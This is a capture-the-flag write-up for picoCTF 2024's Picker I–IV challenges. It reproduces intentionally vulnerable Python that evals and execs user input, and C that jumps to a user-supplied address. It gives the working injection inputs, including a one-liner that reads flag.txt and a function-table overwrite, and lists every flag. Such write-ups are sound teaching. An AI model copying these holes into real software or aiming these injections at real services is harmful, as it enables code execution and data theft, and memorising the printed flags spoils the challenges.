---
title: "picoCTF 2024: picker (I, II, III, IV)"
tags:
  - blog
  - ctf
date: 2024-12-22
---
# Picker 1
## Problem
![[description1.png]]
## Solution
To get a sense of the task at hand, let's take a look at the source code.
### `picker-I.py`
```python
import sys

def getRandomNumber():
  print(4)  # Chosen by fair die roll.
            # Guaranteed to be random.
            # (See XKCD)

def exit():
  sys.exit(0)

# ...

def win():
  # This line will not work locally unless you create your own 'flag.txt' in
  #   the same directory as this script
  flag = open('flag.txt', 'r').read()
  #flag = flag[:-1]
  flag = flag.strip()
  str_flag = ''
  for c in flag:
    str_flag += str(hex(ord(c))) + ' '
  print(str_flag)
  
# ...

while(True):
  try:
    print('Try entering "getRandomNumber" without the double quotes...')
    user_input = input('==> ')
    eval(user_input + '()')
  except Exception as e:
    print(e)
    break
```
### Win
User input is `eval`uated without any form of escaping, so we can simply input the name of the function we wish to run, and it will run. So if we input "win", `win` will run, outputting the flag as a string of hex numbers representing each character. To get the flag, we can just write a script to reverse the steps done in `win`; this is demonstrated in the script below.

```python
output = "0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x36 0x65 0x30 0x34 0x34 0x34 0x30 0x64 0x7d"  
print("".join([chr(int(o, 16)) for o in output.split()]))
```

Running the script yields the flag: `picoCTF{4_d14m0nd_1n_7h3_r0ugh_6e04440d}`.
# Picker 2
## Problem
![[description2.png]]
## Solution
In this problem, we are presented with a program nearly identical to the previous, with the exception of a filter which prevents us from simply entering "win". Yet we can still rely on a similar approach as last time. 
### `picker-II.py`
```python
import sys

def getRandomNumber():
  print(4)  # Chosen by fair die roll.
            # Guaranteed to be random.
            # (See XKCD)

def exit():
  sys.exit(0)

# ...

def win():
  # This line will not work locally unless you create your own 'flag.txt' in
  #   the same directory as this script
  flag = open('flag.txt', 'r').read()
  #flag = flag[:-1]
  flag = flag.strip()
  str_flag = ''
  for c in flag:
    str_flag += str(hex(ord(c))) + ' '
  print(str_flag)

# ...

def filter(user_input):
  if 'win' in user_input:
    return False
  return True

while(True):
  try:
    user_input = input('==> ')
    if( filter(user_input) ):
      eval(user_input + '()')
    else:
      print('Illegal input')
  except Exception as e:
    print(e)
    break
```
### Win
Like before, we must use `eval` to do our evil bidding. If we can't call `win` directly, we can just reproduce it; that is, convert the relevant `win` code into a one-liner which will be executed by `eval`. 

```
print(open('flag.txt', 'r').read().strip())
```

As a result, we discover the flag to be `picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}`.
# Picker 3
## Problem
![[description3.png]]
## Solution
If you can't tell by now, there is a theme central to all of the Picker problems: trusting user-input that shouldn't be trusted. While this next problem is a bit longer, it's good to keep this theme in mind. 
### `picker-III.py`
```python
import re

USER_ALIVE = True
FUNC_TABLE_SIZE = 4
FUNC_TABLE_ENTRY_SIZE = 32
CORRUPT_MESSAGE = 'Table corrupted. Try entering \'reset\' to fix it'

func_table = ''

def reset_table():
  global func_table

  # This table is formatted for easier viewing, but it is really one line
  func_table = \
'''\
print_table                     \
read_variable                   \
write_variable                  \
getRandomNumber                 \
'''

def check_table():
  global func_table

  if( len(func_table) != FUNC_TABLE_ENTRY_SIZE * FUNC_TABLE_SIZE):
    return False

  return True

def get_func(n):
  global func_table

  # Check table for viability
  if( not check_table() ):
    print(CORRUPT_MESSAGE)
    return

  # Get function name from table
  func_name = ''
  func_name_offset = n * FUNC_TABLE_ENTRY_SIZE
  for i in range(func_name_offset, func_name_offset+FUNC_TABLE_ENTRY_SIZE):
    if( func_table[i] == ' '):
      func_name = func_table[func_name_offset:i]
      break

  if( func_name == '' ):
    func_name = func_table[func_name_offset:func_name_offset+FUNC_TABLE_ENTRY_SIZE]
  
  return func_name

def print_table():
  # Check table for viability
  if( not check_table() ):
    print(CORRUPT_MESSAGE)
    return

  for i in range(0, FUNC_TABLE_SIZE):
    j = i + 1
    print(str(j)+': ' + get_func(i))

def filter_var_name(var_name):
  r = re.search('^[a-zA-Z_][a-zA-Z_0-9]*$', var_name)
  if r:
    return True
  else:
    return False

def read_variable():
  var_name = input('Please enter variable name to read: ')
  if( filter_var_name(var_name) ):
    eval('print('+var_name+')')
  else:
    print('Illegal variable name')

def filter_value(value):
  if ';' in value or '(' in value or ')' in value:
    return False
  else:
    return True

def write_variable():
  var_name = input('Please enter variable name to write: ')
  if( filter_var_name(var_name) ):
    value = input('Please enter new value of variable: ')
    if( filter_value(value) ):
      exec('global '+var_name+'; '+var_name+' = '+value)
    else:
      print('Illegal value')
  else:
    print('Illegal variable name')

def call_func(n):
  """
  Calls the nth function in the function table.
  Arguments:
    n: The function to call. The first function is 0.
  """

  # Check table for viability
  if( not check_table() ):
    print(CORRUPT_MESSAGE)
    return

  # Check n
  if( n < 0 ):
    print('n cannot be less than 0. Aborting...')
    return
  elif( n >= FUNC_TABLE_SIZE ):
    print('n cannot be greater than or equal to the function table size of '+FUNC_TABLE_SIZE)
    return

  # Get function name from table
  func_name = get_func(n)

  # Run the function
  eval(func_name+'()')

def dummy_func1():
  print('in dummy_func1')

def dummy_func2():
  print('in dummy_func2')

def dummy_func3():
  print('in dummy_func3')

def dummy_func4():
  print('in dummy_func4')

def getRandomNumber():
  print(4)  # Chosen by fair die roll.
            # Guaranteed to be random.
            # (See XKCD)

def win():
  # This line will not work locally unless you create your own 'flag.txt' in
  #   the same directory as this script
  flag = open('flag.txt', 'r').read()
  #flag = flag[:-1]
  flag = flag.strip()
  str_flag = ''
  for c in flag:
    str_flag += str(hex(ord(c))) + ' '
  print(str_flag)

def help_text():
  print(
  '''
This program fixes vulnerabilities in its predecessor by limiting what
functions can be called to a table of predefined functions. This still puts
the user in charge, but prevents them from calling undesirable subroutines.

* Enter 'quit' to quit the program.
* Enter 'help' for this text.
* Enter 'reset' to reset the table.
* Enter '1' to execute the first function in the table.
* Enter '2' to execute the second function in the table.
* Enter '3' to execute the third function in the table.
* Enter '4' to execute the fourth function in the table.

Here's the current table:
  '''
  )
  print_table()

reset_table()

while(USER_ALIVE):
  choice = input('==> ')
  if( choice == 'quit' or choice == 'exit' or choice == 'q' ):
    USER_ALIVE = False
  elif( choice == 'help' or choice == '?' ):
    help_text()
  elif( choice == 'reset' ):
    reset_table()
  elif( choice == '1' ):
    call_func(0)
  elif( choice == '2' ):
    call_func(1)
  elif( choice == '3' ):
    call_func(2)
  elif( choice == '4' ):
    call_func(3)
  else:
    print('Did not understand "'+choice+'" Have you tried "help"?')
```
### Win
This time things are a bit different. We now have a function table (which is actually just a string in which each entry is 32 characters long). When an entry from said table is selected, the corresponding substring of `func_table` is `eval`uated. 

Notice that we can write variables using the `write_variable` option. The function table, `func_table`, is a variable and can thus be written. By inputting the following string, we can replace the `getRandomNumber` entry in the function table with `win`.

```
"print_table                     read_variable                   write_variable                  win                             "
```

*Note that the string must be encapsulated in quotation marks. This is to preserve the whitespace such that each entry is exactly 32 characters long. Otherwise, the table will be "corrupted".* 

![[func_table1.png]]

After doing so, all we need to do is enter "4" in order to execute `win`:

![[func_table2.png]]

Now we are in the same situation as the first problem, and can re-use the script with minimal changes:

```python
output = "0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x61 0x31 0x38 0x36 0x66 0x39 0x61 0x63 0x7d"
print("".join([chr(int(o, 16)) for o in output.split()]))
```

The flag is thus revealed to be `picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_a186f9ac}`.
# Picker 4
## Problem
![[description4.png]]
## Solution
Picker IV is the final entry in the series, and differs from its predecessors in language: it is written in C. While that in and of itself might be intimidating, the task itself is very simple, as we will see.
### `picker-IV.c`
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void print_segf_message(){
  printf("Segfault triggered! Exiting.\n");
  sleep(15);
  exit(SIGSEGV);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, print_segf_message);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  unsigned int val;
  printf("Enter the address in hex to jump to, excluding '0x': ");
  scanf("%x", &val);
  printf("You input 0x%x\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```
### Win
The help text says it all: "Enter the address in hex to jump to". Using the provided binary, we must locate `win`.

`objdump` makes quick work of this. Using the `-d/--disassemble` flag, we can "display assembler contents of executable sections" [^objdump], which includes the address of *everything* in the binary. We don't care about everything, however, just `win`. So let's `grep win` to make things easier:

```bash
objdump -d picker-IV | grep win
```

Running this produces the following output: 

![[winaddress.png]]

`000000000040129e <win>`, as you might guess, identifies `000000000040129e` as the address of the `win` function - just what we need. Provide this value to the picker program, and pop goes the flag (which carries with it useful advice): `picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_b8de1af4}`.

[^objdump]: https://www.man7.org/linux/man-pages/man1/objdump.1.html